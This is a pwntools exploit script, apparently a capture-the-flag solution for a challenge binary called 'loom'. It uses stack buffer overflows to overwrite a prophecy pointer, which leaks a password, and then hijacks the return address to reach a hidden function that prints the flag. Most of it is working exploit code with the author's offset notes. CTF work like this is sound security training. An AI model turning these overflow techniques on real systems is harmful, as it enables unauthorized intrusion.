#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('loom')

host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 33616)
#  context.log_level = "DEBUG"

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
break *0x4017bb
continue
'''.format(**locals())

#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)

def leak_password(io):
    io.sendline(b"1")
    io.sendline(b"1")
    """
    281 is minimum to get a crash
    - The prophecy gets overwritten to be "A\n"

    280 Prints nothing as propechy
    - The pointer changes to 0x40000a though

    279 has prophecy as "o much prophecy. Life needs some mystery."
    - The pointer to the st starts as 0x40233f but turns into 0x402300
      which explains the clip. Unclear why this happens.

    If we can overwrite prophecy with "0x40232a" we might print flag. 0x2a is *
    """
    #  0x40232a (address of passsword)
    io.sendline(b"A"*280+b"\x2a\x23\x40\x00\x00")
    io.sendline(b"2")
    io.recvuntil(b"ancient : \n\n")

    password = io.clean()[:-1].split(b"\n")[0]
    return password

def leak_flag(io, password):
    io.sendline(b"1") # enter loom room
    io.sendline(b"1") # start prophesize

    # theVoid location: 0x4012b6
    io.sendline(b"A"*152+b"\xb6\x12\x40\x00\x00\x00\x00")
    io.sendline(b"3") # go into room of fates
    io.sendline(password) # enter phrase
    io.sendline(b"1") # corrupt reality

    io.recvuntil(b"yours.\n\n")
    flag = io.clean()[:-1].split(b"\n")[0]
    return flag

def do_exploit():
    io = start()
    password = leak_password(io)

    # restart because we already corrupted the prophecy pointer we need to
    # control for the second stage
    io = start()
    flag = leak_flag(io, password)
    print(flag)

do_exploit()
